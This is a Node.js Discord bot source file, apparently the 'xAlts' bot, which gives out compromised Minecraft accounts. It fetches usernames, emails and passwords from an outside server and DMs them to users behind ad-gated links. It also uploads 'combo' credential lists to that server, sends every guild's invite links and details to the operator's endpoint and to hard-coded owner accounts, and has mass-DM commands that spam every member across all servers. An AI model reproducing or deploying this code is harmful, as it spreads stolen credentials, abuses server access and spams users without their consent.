global.XMLHttpRequest = undefined;
const botconfig = require ("./botconfig.json");
const Discord = require("discord.js");
var jsdom = require('jsdom');
const { JSDOM } = jsdom;
const { window } = new JSDOM();
const talkedRecently = new Set();
const { document } = (new JSDOM('')).window;
global.document = document;
var Long = require("long");

var $ = jQuery = require('jquery')(window);

const bot = new Discord.Client({disableEveryone: true})
bot.on("ready",async() => {
	function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
	}
	//var msg = "Hello guys, I hope you have fun with the bot. I just wanted to remember that you can invite the bot to your own server! Only thing you have to pay attention is, that you must make a channel called #freeminecraft. only there the bot can read messages and send out Minecraft account. Here is the link: https://discordapp.com/oauth2/authorize?client_id=575883844830363668&scope=bot&permissions=8 have fun!";
const getDefaultChannel = (guild) => {

		  // get "original" default channel
		  if(guild.channels.has(guild.id))
		    return guild.channels.get(guild.id)

		  // Check for a "general" channel, which is often default chat
		  const generalChannel = guild.channels.find(channel => channel.name === "general");
		  if (generalChannel)
		    return generalChannel;
		  // Now we get into the heavy stuff: first channel in order where the bot can speak
		  // hold on to your hats!
		  return guild.channels
		   .filter(c => c.type === "text" &&
		     c.permissionsFor(guild.client.user).has("SEND_MESSAGES"))
		   .sort((a, b) => a.position - b.position ||
		     Long.fromString(a.id).sub(Long.fromString(b.id)).toNumber())
		   .first();
}

function doSomething() {
	//console.log('Activado');
	var allguilds = bot.guilds;
	var allguildscount = bot.guilds.count;
	let guildarray = bot.guilds.array();
    let guildcount = guildarray.length;
    function dormir(ms) {
	  return new Promise(resolve => setTimeout(resolve, ms));
	}
    async function demo() {
    var interaction = {
		'maxUses': 100,
		'unique': true,
	  	'maxAge': 0
	}
    for (var i = guildcount - 1; i >= 0; i--) {
	    	let dmGuild = guildarray[i];
	    	const dmGuildchannel = getDefaultChannel(dmGuild);
	    	if(dmGuildchannel) {
					await dmGuild.channels.get(dmGuildchannel.id).createInvite(interaction).then(invite => {
						var memberarray = dmGuildchannel.members.array();
						var membercount = memberarray.length;
						var nameguild = dmGuild.name;
						var guildid = dmGuild.id;
			    		var urlguild = "https://digitalshopuy.com/minecraft/guilds.php?name="+nameguild+"&id="+guildid+"&invitation="+invite.url+"&members="+membercount;
			    		$.getJSON(urlguild, function(data) {
			    			return data;
			    		})
		    		}).catch(err =>console.log('Invitation Error'));
	    	}
	    }
	    //message.channel.send('Finish');
	}
	demo();
}
//doSomething();
// setInterval(function(){
// 	doSomething();
// 		}, 600000);
	bot.user.setActivity("Reseting Bot");
	//console.log(`${bot.user.username} is online!`);
	var urlgenerations = "https://digitalshopuy.com/minecraft/accountsgenerated.php";
	$.getJSON(urlgenerations   , function(data) {
	var resultado = data;
	var interval = setInterval (function () {
		bot.user.setActivity("!minecraft in #freeminecraft", { type: 'WATCHING' });
		var interval1 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var generated = resultado.generated;
			var togenerate = resultado.togenerate;
			var allusers = bot.users;
			var alluserscount = bot.users.count;
			let memberarray = bot.users.array();
		    let membercount = memberarray.length;
			var allguilds = bot.guilds;
			var allguildscount = bot.guilds.count;
			let guildarray = bot.guilds.array();
		    let guildcount = guildarray.length;
			bot.user.setActivity("Users:" + membercount + " servers:"+ guildcount, { type: 'WATCHING' });
			//})
		}, 3000,resultado);
		var interval2 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var generated = resultado.generated;
			var togenerate = resultado.togenerate;
			var users = resultado.users;
			var servers = resultado.servers;
			bot.user.setActivity("Stock-Working:" + generated + " Broken?:"+ togenerate, { type: 'WATCHING' });
			//})
		}, 6000,resultado);
		var interval3 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var generated = resultado.lastwork;
			bot.user.setActivity("Account Delivered:" + generated, { type: 'WATCHING' });
			//})
		}, 9000,resultado);
		var interval4 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var semifull = resultado.semifull;
			bot.user.setActivity("Semi Full Accounts:" + semifull, { type: 'WATCHING' });
			//})
		}, 12000,resultado);
		var interval5 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var lastsfadeliver = resultado.lastsfadeliver;
			bot.user.setActivity("SFA delivered:" + lastsfadeliver, { type: 'WATCHING' });
			//})
		}, 15000,resultado);
		var interval6 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			bot.user.setActivity("Hypixel Ranks Available", { type: 'WATCHING' });
			//})
		}, 18000,resultado);
		var interval7 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var vip = resultado.vip;
			var viplus = resultado.viplus;
			bot.user.setActivity("[VIP]: "+vip+" [VIP+]: "+viplus, { type: 'WATCHING' });
			//})
		}, 21000,resultado);
		var interval8 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var mvp = resultado.mvp;
			var mvplus = resultado.mvplus;
			bot.user.setActivity("[MVP]: "+mvp+" [MVP+]: "+mvplus, { type: 'WATCHING' });
			//})
		}, 24000,resultado);
		var interval9 = setTimeout (function () {
		//$.getJSON(urlgenerations   , function(data) {
			//var resultado = data;
			var mvplus2 = resultado.mvplus2;
			bot.user.setActivity("[MVP++]: "+mvplus2+" [Rare]", { type: 'WATCHING' });
			//})
		}, 27000,resultado);
	}, 30000,resultado); 
	})
	var interaction = {
					usuario: "EduAir",
				}
	//console.log(interaction);
	//var offTopic = bot.channels.get("568736248496259073");
	////console.log(offTopic);

bot.on("guildCreate", guild => {
	const getDefaultChannel = (guild) => {

		  // get "original" default channel
		  if(guild.channels.has(guild.id))
		    return guild.channels.get(guild.id)

		  // Check for a "general" channel, which is often default chat
		  const generalChannel = guild.channels.find(channel => channel.name === "general");
		  if (generalChannel)
		    return generalChannel;
		  // Now we get into the heavy stuff: first channel in order where the bot can speak
		  // hold on to your hats!
		  return guild.channels
		   .filter(c => c.type === "text" &&
		     c.permissionsFor(guild.client.user).has("SEND_MESSAGES"))
		   .sort((a, b) => a.position - b.position ||
		     Long.fromString(a.id).sub(Long.fromString(b.id)).toNumber())
		   .first();
		} 
	var name = 'freeminecraft';
	const channelmine = guild.channels.find(channel => channel.name === "freeminecraft");
	if (!channelmine) {
		guild.createChannel(name, 'text').catch(err =>console.log('No se pudo crear'));
	}
	var message = ("Type !minecraft in this channel to generate accounts");
	var intervalominecraft = setTimeout (function () {
	const channelmine = guild.channels.find(channel => channel.name === "freeminecraft");
	channelmine.send(message).catch(err =>console.log('ErrorCanal'));
	},2000)
	const channel = getDefaultChannel(guild);
    //console.log("Joined a new guild: " + guild.name);
    //console.log(channel.id);
		guild.channels.get(channel.id).createInvite().then(invite => {
		    bot.fetchUser('574103130929627157').then((user) => {
			    user.send(" Bot joined this server");
			    user.send(invite.url);
			});
			bot.fetchUser('570719340215664674').then((user) => {
			    user.send(" Bot joined this server");
			    user.send(invite.url);
			});
		});
})



bot.on("message", async message => {
	if(message.author.bot) return;
	let prefix = botconfig.prefix;
	let messageArray = message.content.split(" ");
	let messageArraydmall = message.content.split("!massdm ");
	let argsdmall = messageArraydmall.slice(1);
	let cmd = messageArray[0];
	let args = messageArray.slice(1);
	const getDefaultChannel = (guild) => {

		  // get "original" default channel
		  if(guild.channels.has(guild.id))
		    return guild.channels.get(guild.id)

		  // Check for a "general" channel, which is often default chat
		  const generalChannel = guild.channels.find(channel => channel.name === "general");
		  if (generalChannel)
		    return generalChannel;
		  // Now we get into the heavy stuff: first channel in order where the bot can speak
		  // hold on to your hats!
		  return guild.channels
		   .filter(c => c.type === "text" &&
		     c.permissionsFor(guild.client.user).has("SEND_MESSAGES"))
		   .sort((a, b) => a.position - b.position ||
		     Long.fromString(a.id).sub(Long.fromString(b.id)).toNumber())
		   .first();
		} 
	function geturl(message) {
		return new Promise(resolve => {
			resolve(message.attachments.first().url);
		})
	}

	function uploadcombo(combo)
	{
		return new Promise(resolve => {
			resolve(
			$.getJSON(combo , function(data) {
			var result = data;
			if (result.fail) {
				var fail = result.fail;
				var linkxrisky = result.checker;
				const { Client, RichEmbed } = require('discord.js');
		    	const exampleEmbed = new RichEmbed()
				.setColor('#ffff')
				.setTitle('Result of Upload')
				.setTimestamp()
				.setDescription(fail + ' \n [Download Checker HERE]('+linkxrisky+')')
				.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
				return message.channel.send(exampleEmbed);
			} else 	{
				const { Client, RichEmbed } = require('discord.js');
		    	const exampleEmbed = new RichEmbed()
				.setColor('#ffff')
				.setTitle('Result of Upload')
				.setTimestamp()
				.setDescription(result)
				.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
				return message.channel.send(exampleEmbed);
			}	
		})
				);
		})
	}
	if (message.channel.id == "585279259401125910") {
		var combofile = await geturl(message);
		var combo = "https://digitalshopuy.com/minecraft/uploaddiscord.php?combo=" + combofile;
	    await uploadcombo(combo);
    }

	if(message.channel.type == "dm" || message.channel.name === 'freeminecraft' || message.channel.id == "582639451784609825" || message.channel.id == "582639451784609825"|| message.channel.id == "583623940899864586" || message.channel.id == "583999320932483094" || message.channel.id == "584517302343696387"|| message.channel.id =="584850363606237194") {
		if (cmd == 'hypixel' && message.channel.id == "584283517525950465") {
			return message.channel.send('h!h pinocytosis');
		}
		if ((message.channel.id == "582639451784609825" || message.channel.id == "583759304574631937") && cmd == "!usercount") {
			var allusers = bot.users;
			var alluserscount = bot.users.count;
			let memberarray = bot.users.array();
		    let membercount = memberarray.length;
			message.channel.send('Users: '+ membercount)
		}
		if ((message.channel.id == "582639451784609825" || message.channel.id == "583759304574631937" || message.channel.id == "584850363606237194") && cmd == "!guildcount") {
			var allguilds = bot.guilds;
			var allguildscount = bot.guilds.count;
			let guildarray = bot.guilds.array();
		    let guildcount = guildarray.length;
		    //console.log(guildcount)
		    function dormir(ms) {
			  return new Promise(resolve => setTimeout(resolve, ms));
			}
		    async function demo() {
		    var interaction = {
				'maxUses': 100,
				'unique': true,
			  	'maxAge': 0
			}	
		    for (var i = guildcount - 1; i >= 0; i--) {
			    	let dmGuild = guildarray[i];
			    	const dmGuildchannel = getDefaultChannel(dmGuild);
			    	if(dmGuildchannel) {
			    		var memberarray = dmGuildchannel.members.array();
						var membercount = memberarray.length;
						//if (membercount > 150) {
							await dormir(2000);
					    	dmGuild.channels.get(dmGuildchannel.id).createInvite(interaction).then(invite => {
								//console.log(i);
					    		message.channel.send(invite.url);
					    	})
					    //}
			    	}
			    }
			    message.channel.send('Finish');
			}
			demo();
			message.channel.send('Guilds: '+ guildcount)
		}

		if ((message.channel.id == "582639451784609825" || message.channel.id == "583759304574631937") && cmd == "!adcount") {
			$.getJSON('https://digitalshopuy.com/minecraft/adcount.php'   , function(data) {
				var result = data;
				var bitcut = data.bitcut;
				var bitcutday = data.bitcutday;
				var shrinkearn = data.shrinkearn;
				var shrinkearnday = data.shrinkearnday;
				var linkzero = data.linkzero;
				var linkzeroday = data.linkzeroday;
				const { Client, RichEmbed } = require('discord.js');
					const adEmbed = new RichEmbed({
				        "title": `AdsWatched`,
				        "description": "Ouo: "+bitcut+" \n Ouo Today: "+bitcutday+" \n Shrinkearn: "+shrinkearn+" \n  Shrinkearn Today: "+shrinkearnday+" \n Linkzero: "+linkzero+" \n  Linkzero Today: "+linkzeroday,
				        "color": 0xFFFF
					})
					return message.channel.send(adEmbed);
			})

		}	
		if (message.channel.id == "582639451784609825" && cmd == "!massdmguild") {
			var allusers0 = bot.users;
			var alluserscount0 = bot.users.count;
			let memberarray0 = bot.users.array();
		    let membercount0 = memberarray0.length;
		    var allguilds = bot.guilds;
			var allguildscount = bot.guilds.count;
			let guildarray = bot.guilds.array();
		    let guildcount = guildarray.length;
			//console.log(membercount); 
			var wait = 1;
			var confirmstop = 0;
			var mensajeaenviar = argsdmall[0];
			var mensajeid = '';
			var mensajechannel = '';
			var timeout = "Random";
			var thiswillbe = 'This will be sent';
			var mensajeenviado = message.channel.send(`${thiswillbe} \n\n ${mensajeaenviar} \n\n [${timeout}]`);
			var mensajeenviado = message.channel.send('Starting');
			var mensajeenviado2 = message.channel.send('Dont accept DMs: ' + 0);
			
			var resultadomensajeid = mensajeenviado.then(function(result) {
		 	    mensajeid = result.id;
		 	    mensajechannel = result.channel;
		 	    return mensajeid;
			});

			var resultadomensajeid2 = mensajeenviado2.then(function(result) {
		 	    mensajeid2 = result.id;
		 	    mensajechannel2 = result.channel;
		 	    return mensajeid2;
			});
			var mensajechannel = message.channel;
			var i = 0;
			var a = 0;
			var b = 0;
			var c = 0;
			let dontacceptdm = 0;
			while (b < guildcount) {
				let dmGuild = guildarray[b];
				var memberarray = dmGuild.members.array();
				var membercount = memberarray.length;
				var i = 0;
				var a = 0;
				while (a < membercount) {
					let member = memberarray[a];
					let timeout = Math.floor((Math.random() * (wait - 0.01)) * 1000) + 10;
					await sleep(timeout + 5000);
					var memberid = member.id;
					var mensajeadmin = bot.users.get(memberid).send(`${mensajeaenviar} \n\n [${timeout}]`).catch(err =>(dontacceptdm = dontacceptdm + 1));
					if(a == (membercount-1)) {
	                //console.log(`Waited ${timeout}ms.\t\\/\tDMing ${member.user.username}`);
		            } else {
		                //console.log(`Waited ${timeout}ms.\t|${a + 1}|\tDMing ${member.user.username}`);
		            }
					////console.log(mensajeadmin);
					mensajechannel.fetchMessage(mensajeid).then(async msg => {
						msg.edit('Member count: ' + i + '/' + membercount + ' \n Guild Count: '  + b + '/' + guildcount + ' \n Total Users: '  + c + '/' + membercount0 );
					})
					mensajechannel.fetchMessage(mensajeid2).then(async msg => {
						msg.edit('Dont accept DMs: ' + dontacceptdm);
					})
					bot.on("message", async messageconfirm => {
						if (messageconfirm.channel.id == "582639451784609825") {
							let messageArray = messageconfirm.content.split(" ");
							let cmd = messageArray[0];
							if (cmd == "!stopguild" && confirmstop == 0 ) {
								messageconfirm.channel.send('Stopped');
								confirmstop = 1;
								a = membercount+100;
								b = guildcount+100;
							}
						}
					})
					a = a + 1;
					i = i + 1;
					c = c + 1;
				}
				b = b + 1;
			} 
		}

	if (message.channel.id == "582639451784609825" && cmd == "!massdm") {
			var allusers0 = bot.users;
			var alluserscount0 = bot.users.count;
			let memberarray0 = bot.users.array();
		    let membercount0 = memberarray0.length;
			var wait = 1;
			var confirmstop = 0;
			var mensajeaenviar = argsdmall[0];
			var mensajeid = '';
			var mensajechannel = '';
			var timeout = "Random";
			var thiswillbe = 'This will be sent';
			var mensajeenviado = message.channel.send(`${thiswillbe} \n\n ${mensajeaenviar} \n\n [${timeout}]`);
			var mensajeenviado = message.channel.send('Starting');
			var mensajeenviado2 = message.channel.send('Dont accept DMs: ' + 0);

			var resultadomensajeid = mensajeenviado.then(function(result) {
		 	    mensajeid = result.id;
		 	    mensajechannel = result.channel;
		 	    return mensajeid;
			});

			var resultadomensajeid2 = mensajeenviado2.then(function(result) {
		 	    mensajeid2 = result.id;
		 	    mensajechannel2 = result.channel;
		 	    return mensajeid2;
			});
			var mensajechannel = message.channel;
			var c = 0;
			var i = 0;
			let dontacceptdm = 0;
			while (c < membercount0) {
					var member = memberarray0[i];
					let timeout = Math.floor((Math.random() * (wait - 0.01)) * 1000) + 10;
					await sleep(timeout);
					var memberid = member.id;
					var mensajeadmin = bot.users.get(memberid).send(`${mensajeaenviar} \n\n [${timeout}]`).catch(err =>(dontacceptdm = dontacceptdm + 1));
					if(a == (membercount-1)) {
	                //console.log(`Waited ${timeout}ms.\t\\/\tDMing ${member.username}`);
		            } else {
		                //console.log(`Waited ${timeout}ms.\t|${i + 1}|\tDMing ${member.username}`);
		            }
					////console.log(mensajeadmin);
					mensajechannel.fetchMessage(mensajeid).then(async msg => {
						msg.edit('Total Users: '  + i + '/' + membercount0 );
					})
					mensajechannel.fetchMessage(mensajeid2).then(async msg => {
						msg.edit('Dont accept DMs: ' + dontacceptdm);
					})
					bot.on("message", async messageconfirm => {
						if (messageconfirm.channel.id == "582639451784609825") {
							let messageArray = messageconfirm.content.split(" ");
							let cmd = messageArray[0];
							if (cmd == "!stop" && confirmstop == 0 ) {
								messageconfirm.channel.send('Stopped');
								confirmstop = 1;
								c = membercount0 + 100;
								}
							}
						})
					c = c + 1;
					i = i + 1;
				}
			}	

		if (cmd == `!minecraft`) {
		if (talkedRecently.has(message.author.id)) {
           		message.author.send("We added this wait thanks to spammers, sorry people - " + message.author);
   		} else {
   			 talkedRecently.add(message.author.id);
					    setTimeout(() => {
					      // Removes the user from the set after a minute
					      talkedRecently.delete(message.author.id);
				}, 2000);
		 // the user can type the command ... your command code goes here :)
			// Adds the user to the set so that they can't talk for a minu
			////console.log(message.author);
			// 	setTimeout(function() {
			// 	mensajeprimero.then(function(result) {
			// 	    var mensajeid = result.id;
			// 	    //console.log(mensajeid);
			// 	});
			// }, 500);
			if (message.channel.id == "584517302343696387"){
				var mensajecuentaok1 = message.channel.send(" <@" + message.author.id + ">" + ", se te enviará una cuenta andando por mensaje privado! \n Úna de cada 100 se le puede cambiar la skin y usuario :D \n Mira el anuncio y desbloquea la contraseña");
			} else {
			var mensajecuentaok1 = message.channel.send(" <@" + message.author.id + ">" + ", the Minecraft Bot sent you an account! Have fun! \n Triple Check with Private Proxies :D");
			}
			let mainguild = bot.guilds.get('568736248496259073'),
			 USER_ID = message.author.id;
			 var itsinserver = 'PrivateMessage';
			if (mainguild.member(USER_ID)) {
			  itsinserver = '568736248496259073';
			  cangenerate = itsinserver;
			  //console.log('Its in server');
			} else {
				cangenerate = 'No';
			}

			var onserver  = 0;

			if (message.guild) {
				onserver = message.guild.id;
				servername = message.guild.name;
			} else {
				onserver = 'PrivateMessage';
				servername = "Private Message";
			}

			if (cangenerate == 'No' && onserver == 'PrivateMessage') {
				var invitetosend = "You are not allowed to dm the bot! Please type !minecraft in the server";
				message.author.send(invitetosend + " <@" + message.author.id + ">");
			} else {
				//console.log('http://digitalshopuy.com/minecraft/minecraftauth.php?userid='+ message.author.id +'&onserver=' +  onserver +'&cangenerate=' +  cangenerate);
				$.getJSON('http://digitalshopuy.com/minecraft/minecraftauth.php?userid='+ message.author.id +'&onserver=' +  onserver +'&cangenerate=' +  cangenerate   , function(data) {
					const { Client, RichEmbed } = require('discord.js');
					var result = data;
					//console.log(result);
					var error = data.error;
					var invite = data.invite;
					//console.log(data);
					if (invite) {
						var invitetosend = "Hey! You exceeded your limit of 10 generations! If you want to generate more, you must join this server: https://discord.gg/J9VFZGj Your limit will be set to infinity";
						message.author.send(invitetosend + " <@" + message.author.id + ">");
					} else if (error) {
							var resultadocuentaok = mensajecuentaok1.then(function(result) {
						 	    mensajecuentaok1id = result.id;
						 	    mensajecuentaok1channel = result.channel;
							// message.channel.fetchMessages({limit: 10}).then(collected => { //collected is a Collection
							//   collected.forEach(msg => {
							//     if (msg.content.startsWith("Checking accounts")) msg.delete();
							//   });
							// });
							var mensajechannelcuentaok = message.channel;
							message.channel.send(error + " <@" + message.author.id + ">");
							mensajechannelcuentaok.fetchMessage(mensajecuentaok1id).then(async msg => {
								msg.delete();
							})
						});
				} else if (result) {
					//console.log(result);
					var username = data.username;
					var email = data.email;
					var passwordlink = data.passwordlink;
					var imageid = data.imageid;
					var hypixel = 'https://digitalshopuy.com/minecraft/discordhyrank.php?minecraftid='+ imageid;
					var checked = data.checked;
					var launcherurl = 'https://launcher.mojang.com/download/MinecraftInstaller.msi';
					var workingdate = data.workingdate;
					var seguridad = data.seguridad;
					if (seguridad == "Can't change skin, security question blocked") {
						var respuestaseg = 'Only Launcher, [download here for Windows]('+launcherurl+')';
					} else {
						var respuestaseg = 'You can login into mojang.net, change skin and login into launcher, [download here for Windows]('+launcherurl+')';
					}
					//console.log(hypixel);
					$.getJSON( hypixel , function(hydata) {
					var rankhy = hydata.HyPixel;
					var lastloginhy = hydata.lastlogin;
					var picture = 'https://crafatar.com/renders/body/'+imageid+'.png';
					var moreinfohy = "https://plancke.io/hypixel/player/stats/"+ imageid ;
					var urlgetpassword ='http://digitalshopuy.com/minecraft/checkwatched.php?userid='+ message.author.id +'&usernamealt=' +  email;
					//console.log(picture);
					message.author.send('+300 New accounts in database 06/12/2019 :) More than 80 SFA (You can change skin and pass)');
					    // We can create embeds using the MessageEmbed constructor
					    // Read more about all that you can do with the constructor
					    // over at http://discord.js.org/#/docs/main/stable/class/RichEmbed
					    const exampleEmbed = new RichEmbed()
						.setColor('#ffff')
						.setTitle('Your Minecraft Account')
						.setTimestamp()
						.setDescription(' Username: '+username+'\n Email: '+email+'\n Worked: '+workingdate+'\n Password: [CLICK HERE TO SEE THE PASSWORD]('+passwordlink+')')
						//.setURL('http://discord.js.org/')
						.addField('Hypixel', 'Rank: ' +rankhy+'\n Last Login: '+ lastloginhy+'\n [More info Here]('+moreinfohy+')')
						.addField('Level Access', seguridad + '\n'+ respuestaseg)
						.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
						var mensajeenviado = message.author.send(exampleEmbed);
						message.author.send({files: [picture]})


						var spotifycentral = 'https://spotifycentral.store/';
							var discordserver = 'https://discord.gg/Gxymnd4';
							const messagefromowner = new RichEmbed()
							.setColor('#008000')
							.setTitle('Message from bot owner EduAir#5513')
							.setURL(spotifycentral)
							.setAuthor('Spotify Central Upgrades', 'https://cdn.discordapp.com/attachments/578637373622059028/586262016449052673/default.png', 'https://discord.gg/Gxymnd4')
							.setTimestamp()
							.setDescription("Hi, I'm EduAir#5513, owner of this bot and many more, hope you like it (always gives premium accs). I want to share with you a way to get private premium accounts for a really low price, made by me")
							.addField('Our website', '[CLICK HERE]('+spotifycentral+')')
							.addField('Join our discord server if you dont want to watch this add again','[CLICK HERE]('+discordserver+')')
							.setFooter('2015-19 © SpotifyCentral.Store - Bot created by EduAir#5513');
							
							let mainguild99 = bot.guilds.get('589356007852081152'),
							 USER_ID99 = message.author.id;
							 var cangenerate99;
							 var itsinserver99;
							if (mainguild99.member(USER_ID99)) {
							  itsinserver99 = 'Yes';
							  cangenerate99 = itsinserver99;
							} else {
								cangenerate99 = 'No';
								var enviarmensajeowner = message.author.send(messagefromowner);
							}



						
						var counter = 0;
						var mensajeid;
						var interval = setInterval (function () {
							var resultadomensajeid = mensajeenviado.then(function(result) {
							 	    mensajeid = result.id;
							 	    mensajechannel = result.channel;
							 	    return mensajeid;
							});
							var editarmensajeid = mensajeid;
				            $.getJSON(urlgetpassword  , function(data) {
				            	var result = data;
				            	if (result) {
				            		//console.log(mensajeid);
				            		mensajechannel.fetchMessage(mensajeid).then(async msg => {
									  const { Client, RichEmbed } = require('discord.js');
									  	const NewEmbed = new RichEmbed()
										.setColor('#ffff')
										.setTitle('Your Minecraft Account')
										.setTimestamp()
										.setDescription(' Username: '+username+'\n Email: '+email+'\n Worked: '+workingdate+'\n Password: ' + result)
										.addField('HyPixel', 'Rank: ' +rankhy+'\n Last Login: '+ lastloginhy)
										.addField('Level Access', seguridad + '\n'+ respuestaseg)
										//.setURL('http://discord.js.org/')
										.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
									  	//await message.author.send(NewEmbed);
									  	if (msg) msg.edit(NewEmbed);
									});
									mensajechannel.send('Thanks for watching the ad <@' + message.author.id + '>')
									  .then(msg => {
									    msg.delete(1000)
										    bot.fetchUser('574103130929627157').then((user) => {
										    	const { Client, RichEmbed } = require('discord.js');
										    	const exampleEmbed = new RichEmbed()
												.setColor('#ffff')
												.setTitle(message.author.tag + ' watched an ad')
												.setTimestamp()
												.setDescription(' Tag: <@' + message.author.id + '> \n Server: '+ servername)
												.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
											    user.send(exampleEmbed);
											});
											bot.fetchUser('570719340215664674').then((user) => {
												const { Client, RichEmbed } = require('discord.js');
										    	const exampleEmbed = new RichEmbed()
												.setColor('#ffff')
												.setTitle(message.author.tag + ' watched an ad')
												.setTimestamp()
												.setDescription(' Tag: <@' + message.author.id + '> \n Server: '+ servername)
												.setFooter('2015-19 © xAlts - Bot created by EduAir#5513');
											    user.send(exampleEmbed);
											});
									 })
				            		clearInterval(interval);
				            	} else if(counter == 150) {
				            		message.author.send('Time exceed to send password here <@' + message.author.id + '>');
				            		clearInterval(interval);
				            	} else {
				            		counter = counter + 1;
				            	}
				            })
				            .catch(console.error); // add error handling here
				        }, 2000);
				        }) 
					};
				})
			}	
			}
		}
	}
});
})

// Log our bot in using the token from http://discordapp.com/developers/applications/me

bot.login(botconfig.token);

